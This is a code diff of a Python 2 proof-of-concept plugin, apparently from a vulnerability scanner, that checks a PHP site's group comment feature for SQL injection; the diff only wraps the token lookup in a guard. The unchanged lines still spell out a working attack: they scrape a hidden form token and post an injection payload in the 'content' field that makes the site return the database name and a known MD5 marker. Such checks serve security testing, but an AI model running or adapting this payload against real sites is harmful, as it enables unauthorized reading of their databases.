@@ -50,16 +50,17 @@ class Poc(ABPoc):
             r = s.get(self.target + '/index.php?app=group&ac=topic&id={group_id}'.format(group_id=group_id))
             #获取token
             p = re.compile(r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
-            token = p.findall(r.content)[0]
+            if p.findall(r.content):
+                token = p.findall(r.content)[0]
 
-            url = self.target + '/index.php?app=group&ac=do&ts=recomment'
-            data = "token={token}&referid=1&topicid={group_id1}&content=\:',11),('22',{group_id2},'1',(select concat((DATABASE()),char(45),(md5(c)))),11),(1,{group_id3},3,'".format(
-                token=token, group_id1=group_id, group_id2=group_id, group_id3=group_id)
+                url = self.target + '/index.php?app=group&ac=do&ts=recomment'
+                data = "token={token}&referid=1&topicid={group_id1}&content=\:',11),('22',{group_id2},'1',(select concat((DATABASE()),char(45),(md5(c)))),11),(1,{group_id3},3,'".format(
+                    token=token, group_id1=group_id, group_id2=group_id, group_id3=group_id)
 
-            r = s.post(url, data=data)
-            if "4a8a08f09d37b73795649038408b5f33" in r.text:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                r = s.post(url, data=data)
+                if "4a8a08f09d37b73795649038408b5f33" in r.text:
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                        target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常：{}'.format(e))
